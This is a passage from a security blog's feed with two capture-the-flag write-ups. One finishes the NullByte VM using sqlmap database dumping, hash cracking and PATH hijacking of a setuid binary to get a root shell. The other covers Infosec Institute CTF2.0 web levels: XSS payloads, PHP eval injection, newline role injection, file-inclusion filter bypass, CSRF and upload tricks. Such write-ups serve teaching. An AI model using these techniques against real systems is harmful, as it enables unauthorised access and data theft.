&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --current-db
back-end DBMS: MySQL 5.0.12
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:44&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; fetching current database
current database:    &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;seth&amp;#39;&lt;/span&gt;

root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --tables -D seth
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:55&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; fetching tables &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; database: &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;seth&amp;#39;&lt;/span&gt;
Database: seth
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; table&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
+-------+
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; users &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
+-------+


root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;ramses --dump -D seth -T users
Database: seth
Table: users
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt; entries&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; id &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; pass                                        &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; user   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; position   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ramses &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &amp;lt;blank&amp;gt;    &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;  &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; --not allowed--                             &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; isis   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; employee   &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt;
+----+---------------------------------------------+--------+------------+
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;An MD5 hashed password? I best put that through &lt;a href=&#34;http://md5decoder.org/&#34;&gt;md5decoder&lt;/a&gt; to
be rewarded with the password &lt;code&gt;omega&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&#34;stage-4:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;stage 4&lt;/h1&gt;

&lt;p&gt;Turns out that this is ramses&amp;rsquo;s password on the ssh service that&amp;rsquo;s running on
port 777 on the VM. So I&amp;rsquo;ll connect to that and have a look at what&amp;rsquo;s going on there.&lt;/p&gt;

&lt;p&gt;Not much in his home directory, so I&amp;rsquo;ll checkout what he&amp;rsquo;s been up to&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:~&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;cat .bash_history 
sudo -s
su eric
&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit&lt;/span&gt;
ls
clear
&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /var/www
&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd &lt;/span&gt;backup/
ls
./procwatch 
clear
sudo -s
&lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /
ls
&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Interesting, ramses has something in &lt;code&gt;/var/www&lt;/code&gt;. Seems like a setuid root
binary called &lt;code&gt;procwatch&lt;/code&gt;. After running it I would assume that it&amp;rsquo;s just running &lt;code&gt;ps&lt;/code&gt;
to return a list of processes. If I run &lt;code&gt;ps&lt;/code&gt; on its own, I get the same output (minus
procwatch of course)&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s see if it calls &lt;code&gt;ps&lt;/code&gt; with an absolute path, or not. As a quick test I&amp;rsquo;ll create
a symlink to &lt;code&gt;ls&lt;/code&gt; in the current directory and name it &lt;code&gt;ps&lt;/code&gt;. Then I set the &lt;code&gt;PATH&lt;/code&gt; environment variable
with the current dir at the front.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;ln -s /bin/ls ps
ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ export PATH&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;pwd&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;`&lt;/span&gt;:&lt;span style=&#34;color: #e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;PATH&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;}&lt;/span&gt;
ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;./procwatch 
ls  procwatch  ps  readme.txt
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Excellent, it just calls &lt;code&gt;ps&lt;/code&gt; without a path. A classic issue you can often
find in programs that call other programs.&lt;/p&gt;

&lt;p&gt;So let me leverage this to get myself a root shell and ultimately the flag&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;ln -snf /bin/sh ps
ramses@NullByte:/var/www/backup&lt;span style=&#34;color: #f8f8f2&#34;&gt;$ &lt;/span&gt;./procwatch 
&lt;span style=&#34;color: #75715e&#34;&gt;# whoami &lt;/span&gt;
root
&lt;span style=&#34;color: #75715e&#34;&gt;# cat /root/proof.txt&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;OUTPUT CUT&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;And that concludes the NullByte VM walkthrough. A nice little machine with some fun
challenges. Thanks to ly0n for creating it.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Infosec Institute CTF2.0</title>
      <link>https://svenito.github.io/nowhere/2015/06/25/infosec-institute-ctf2-dot-0/</link>
      <pubDate>Thu, 25 Jun 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/06/25/infosec-institute-ctf2-dot-0/</guid>
      <description>

&lt;p&gt;The folks over at the &lt;a href=&#34;https://infosecinstitute.com&#34;&gt;Infosec Institue&lt;/a&gt; have released
their &lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/&#34;&gt;second CTF&lt;/a&gt;. Here&amp;rsquo;s how I got on&amp;hellip;&lt;/p&gt;

&lt;h1 id=&#34;level-01:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 01&lt;/h1&gt;

&lt;p&gt;In &lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex1.php&#34;&gt;level 01&lt;/a&gt; I am supposed
to use the provided form to perform a cross site scripting exploit. Here&amp;rsquo;s what the form
looks like:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/CJTNyK4.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;At first I might as well test how the form works. Entering something like &lt;code&gt;test&lt;/code&gt; and
&lt;code&gt;www.test.com&lt;/code&gt; in the fields simply adds the supplied information to the column on the left.
So I try the usual XSS payload: &lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Ex1&amp;quot;);&amp;lt;/script&amp;gt;&lt;/code&gt; in the &lt;code&gt;Site Name&lt;/code&gt; field.&lt;/p&gt;

&lt;p&gt;A popup tells me that I need to &lt;em&gt;match the requested format&lt;/em&gt;. Probably some client side
checks, so I inspect the field with Firebug and notice this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/f5KzFDx.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The field has a regular expression premitting only upper or lowercase characters. I can either
delete this or just change it to &lt;code&gt;.+&lt;/code&gt; so it matches any character.&lt;/p&gt;

&lt;p&gt;Now resubmitting the XSS payload works and the string is reflected on the page:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/yvSc4To.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;However, there&amp;rsquo;s no pop up. So there must be something else validating input. Heading back to the
source I find some javscript in &lt;code&gt;ex1.js&lt;/code&gt; which contains the following code:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/VVe74tW.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/VVe74tW.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;siteName&lt;/code&gt; variable has all &lt;code&gt;&amp;lt;&lt;/code&gt; and &lt;code&gt;&amp;gt;&lt;/code&gt; characters replaced with their equivalent html codes.
By clicking on the gutter in the source code I set a breakpoint on the line that does this, and resubmit
my data. The Firebug debugger breaks on the line and I step over it. Sure enough &lt;code&gt;siteName&lt;/code&gt; is not
what I want it to be. Double clicking on the value in the right hand window allows me to edit it, and
revert it back to what I want it to be. Then clicking continue I am rewarded with:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/VEFDpio.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-02:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 02&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex2.php&#34;&gt;Level 02&lt;/a&gt; is a simple web calculator:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/asgTWCw.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I&amp;rsquo;m supposed to use the form to print &lt;code&gt;phpinfo&lt;/code&gt; or other data to the page. This is a PHP
script evaluating a simple expression. I am guessing that it&amp;rsquo;s going to be calling &lt;code&gt;eval&lt;/code&gt;, as
that&amp;rsquo;s a fairly common vulnerability, and fits to how the page works. After entering some numbers
and other characters into the two fields I quickly learn that the input for those fields is checked.
That means I can&amp;rsquo;t enter anything but numbers into those fields. That leaves the operator as the only
other thing under our control.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m going to guess that code looks somewhat like this:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;eval (&amp;quot;print $num1 $op $num2;&amp;quot;);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So I need to change the operand to something that prints &lt;code&gt;phpinfo&lt;/code&gt; but leaves the rest of the statement
valid. With Firebug I can edit the value of the operand to the following:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/8xnqMxv.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Hit submit and&amp;hellip;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/rUgaixe.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-03:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 03&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex3.php&#34;&gt;Level 03&lt;/a&gt; provides me with a registration
form and a login form. The instructions indicate that the data is stored in a delimited file and I need
to sign up as a new user with admin rights.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/f0g5TmV.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;First things first, let&amp;rsquo;s see if we can figure out the delimiter&amp;hellip; Signing up and logging in
shows us our name and current role: &lt;code&gt;role:normal&lt;/code&gt;. This already tells me that the delimiter is not
&lt;code&gt;:&lt;/code&gt;. After fuzzing the input it turns out most characters are ok to use. So what&amp;rsquo;s the delimeter?
I check the hints and it tells me that it&amp;rsquo;s the newline character. Interesting, in my fuzzing I tried that,
but had no luck. Unless..&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s not use &lt;code&gt;\n&lt;/code&gt; but a real new line. I can achieve this by editing the source with Firebug
once again, changing the &lt;code&gt;lastname&lt;/code&gt; field to a &lt;code&gt;textarea&lt;/code&gt; type:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/QBVptMv.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QBVptMv.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now I can have multiple lines and enter a real carriage return into the field. My last
name will be&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;alpha7
role:admin
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And after a login with the new creds:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/Akj9NL8.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-04:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 04&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php&#34;&gt;Level 04&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/nmRe8U2.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/nmRe8U2.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here we need to load a php file instead of the text files that load when you click
on the &lt;em&gt;Bio&lt;/em&gt;, &lt;em&gt;Clients&lt;/em&gt;, or &lt;em&gt;About&lt;/em&gt; buttons. The instructions are very clear,
but it sounds like we need to load a phop file from the root of the domain. Let&amp;rsquo;s
see what restrictions are in place.&lt;/p&gt;

&lt;p&gt;Fuzzing the file parameter I notice that it seems to test for &lt;code&gt;fileNiXtxt&lt;/code&gt; where &lt;em&gt;N&lt;/em&gt; is
any number and &lt;code&gt;X&lt;/code&gt; is any other character. Anything other than that pattern will print &lt;code&gt;Invalid file selected.&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Entering &lt;code&gt;index.php;file1.txt&lt;/code&gt; for example gives a different error: &lt;code&gt;There is something else that you must do.&lt;/code&gt;.
Interesting. So I guess it just needs to be somewhere in that argument for the filter to accept it. But
how can we accomplish this with a valid payload?&lt;/p&gt;

&lt;p&gt;One thing I tried was &lt;code&gt;/file1/txt/../../file.php&lt;/code&gt; which wasn&amp;rsquo;t right either. Here we make use
of relative paths where when PHP opens the file, it will ignore the fact that the path
&lt;code&gt;/file1/txt&lt;/code&gt; doesn&amp;rsquo;t exist and treat this as if &lt;code&gt;file.php&lt;/code&gt; as at &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;UPDATE: Solved&lt;/p&gt;

&lt;p&gt;So the key bit I was missing was that it wanted a remote, even if that remote is the
same domain as the current page. So I added &lt;code&gt;http://infosecinstitute.com/file3.php&lt;/code&gt; as
the argument to get a new error: &lt;em&gt;You are trying to add a remote URL.&lt;/em&gt; Ok, now we are getting somewhere.
As one of the hints is that the regex might be case sensitive, let&amp;rsquo;s capitalise the &lt;code&gt;h&lt;/code&gt; in &lt;code&gt;http&lt;/code&gt;.
This time we get an &lt;em&gt;invalid file&lt;/em&gt; message, so that bypass worked. Now we need to satisfy the
&lt;code&gt;file3.txt&lt;/code&gt; requirement and using &lt;code&gt;Http://infosecinstitute.com/file3.txt.php&lt;/code&gt; I get the flag&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/WTFYtJi.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/WTFYtJi.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-05:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 05&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex5.php&#34;&gt;Level 05&lt;/a&gt; starts by telling
me that I am not logged in.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/BOBdkHX.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Well, I don&amp;rsquo;t remember logging in, so that&amp;rsquo;s not unusual. What is unusual is
that the &lt;code&gt;login&lt;/code&gt; button doesn&amp;rsquo;t work. I&amp;rsquo;ll quickly check the source code and notice
that it&amp;rsquo;s disabled, but also that it points to &lt;code&gt;login.html&lt;/code&gt;. Enabling and clicking it
takes me to a 404, so no go. The vulnerability here is &lt;em&gt;Missing Function Level Access Control&lt;/em&gt;
so perhaps this page assumes we&amp;rsquo;re logged in if we are coming from the login page. Let&amp;rsquo;s
assume that if the user is successful on &lt;code&gt;login.html&lt;/code&gt;, that page will redirect here, and then
this page will just assume that the user is allowed to be here.&lt;/p&gt;

&lt;p&gt;Using an intercepting proxy I&amp;rsquo;ll edit the &lt;code&gt;Referer&lt;/code&gt; field in the original request, so that
it appears to be coming from the login page:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/EK9u7Ir.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Forward the request and&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QCisDvN.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-06:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 06&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex6.php&#34;&gt;Level 06&lt;/a&gt; shows a nice
big text area with allowable HTML tags.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/Waq1AVN.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This time I need to perform a cross site request forgery. This can be accomlished by an &lt;code&gt;href&lt;/code&gt;
tag, but trying this tells me that they are expecting something that will perform the request
without the need for user interaction. Ok, fine, let&amp;rsquo;s revisit the allowed tags. &lt;code&gt;img&lt;/code&gt; looks useful, right?&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s try the following&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/qCd5NUP.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Yep, that&amp;rsquo;s what we needed.&lt;/p&gt;

&lt;h1 id=&#34;level-07:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 07&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php&#34;&gt;Level 07&lt;/a&gt; is a login form on which
we need to perform another XSS attack.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/WO8dRpe.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Well, lucky for me I perform these challenges through a proxy which unhides hidden fields like
the one you see there. Some investigation shows that the value of the hidden field comes from
a php_self value. That is it uses whatever the URL part is to populate the field, so that form
is submitted back to itself.&lt;/p&gt;

&lt;p&gt;Using this we can inject something into the field to hopefully reflect our data on the page.
By employing the &lt;code&gt;arg&lt;/code&gt; paramater we can close the &lt;code&gt;input&lt;/code&gt; tag, and the inject our &lt;code&gt;h1&lt;/code&gt; tags:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php?arg=&amp;#39;&amp;gt;&amp;lt;h1&amp;gt;username&amp;lt;/h1&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Submitting that puts &lt;code&gt;username&lt;/code&gt; on the page surrounded by &lt;code&gt;h1&lt;/code&gt; tags and nabs the flag&lt;/p&gt;

&lt;h1 id=&#34;level-08:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 08&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php&#34;&gt;Level 08&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/610ZNNq.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Here we need to upload an image that will produce a javscript alert. First things first with these
things I upload an image to see how it behaves. Once uploaded I click on the example links and notice that
images are fetched via an id. The URL is&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So let me see if I can access an image via another ID, for example &lt;code&gt;id=4&lt;/code&gt;.
I get the message:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;This attachment is currently under review by our editors. 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So no. Checking out the image URL for one of the chess images shows me that the images
are stored at &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/ex8_assets/img/chess1.png&lt;/code&gt; for example.&lt;/p&gt;

&lt;p&gt;I make a note of this.&lt;/p&gt;

&lt;p&gt;Now can I just upload an html file? That gives me an error of an invalid file type. So let me chack
if it&amp;rsquo;s just checking the extension or if there&amp;rsquo;s something more happening. Intercepting the upload
request with Burp proxy I can change the extension to &lt;code&gt;jpg&lt;/code&gt; and sucessfully upload the html file.&lt;/p&gt;

&lt;p&gt;Now browsing to the image url I am told it cannot display the image due to errors. Well, the browser
is trying to interpret the file as an image, which it clearly isn&amp;rsquo;t. There&amp;rsquo;s got to be another way
to get at my image. How about the object reference in the URL &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1&lt;/code&gt;
for example? Maybe if I just reference the filename directly?&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?file=index.jpg
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Success&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/RVoJGMr.png&#34;&gt;{ %img http://i.imgur.com/RVoJGMr.png %}&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-09:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 09&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex9.php&#34;&gt;Level 09&lt;/a&gt; starts off by showing me the
details of one John Doe.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/8NESmpB.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I need to change something to make it show the details for Mary Jane. There&amp;rsquo;s no URL parms,
no login, so how can the page know who to show? There&amp;rsquo;s one place left: the cookie jar.&lt;/p&gt;

&lt;p&gt;Using Firebug once again I inspect the cookies and sure enough&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/xGdtDa7.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This is &amp;ldquo;JOHN+DOE&amp;rdquo; encoded as base64 as it turns out. One thing to note is when you&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;echo Sk9ITitET0u= | base64 -d
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;there is no newline at end of the name. So to encode &lt;code&gt;MARY+JANE&lt;/code&gt; correctly I need to
use echo with the &lt;code&gt;-n&lt;/code&gt; flag:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt; -n MARY+JANE &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; base64
TUFSWStKQU5F
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Editing the cookie and inserting that base64 string will show us Mary Jane&amp;rsquo;s details.&lt;/p&gt;

&lt;h1 id=&#34;level-10:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 10&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex10.php&#34;&gt;Level 10&lt;/a&gt; is a game and we need to
edit its source so we look like we&amp;rsquo;re really good at it.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/g03njlQ.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Entering anything in the name I field I have a poke around to see how the whole thing
works. We&amp;rsquo;re shown some coloured squares and then they are turn over. We need to then
remember which colour each square had. Except we need to do it at least 9999 times and
at the extreme level, which only shows us the squares for a second.&lt;/p&gt;

&lt;p&gt;Finding the square colours isn&amp;rsquo;t hard. With Firebug we can see:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/isDO7LM.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;and those numbers are 0 indexed into the list of numbers from the selction popup. So playing
along I can win one game. So let&amp;rsquo;s find out where my current win/loss count is stored.&lt;/p&gt;

&lt;p&gt;In the Javscript I find a structure that does this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/gZghIIn.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;but all this does is increment and decrement the values. Clearly that data is stored somewhere.
Turns out that this &lt;code&gt;localstorage&lt;/code&gt; is in the DOM. Using the &lt;em&gt;DOM&lt;/em&gt; tab in Firebug I can find
the structure and its data:&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/xGIZXpb.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Now I can edit the number of wins and then, all I need to do is play one more game to take the flag.&lt;/p&gt;

&lt;h1 id=&#34;level-11:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 11&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex11.php&#34;&gt;Level 11&lt;/a&gt; blacklists me&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/RaGy98O.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

